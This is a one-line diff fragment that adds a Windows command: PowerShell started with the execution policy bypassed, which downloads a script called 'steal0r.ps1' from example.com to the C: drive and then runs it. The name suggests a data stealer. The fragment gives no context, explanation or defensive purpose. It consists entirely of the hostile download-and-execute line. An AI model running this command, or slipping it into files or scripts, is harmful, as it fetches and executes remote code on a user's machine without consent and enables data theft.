@@ -1,0 +1,1 @@
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri 'http://example.com/steal0r.ps1' -OutFile 'C:\steal0r.ps1'; & 'C:\steal0r.ps1'}"
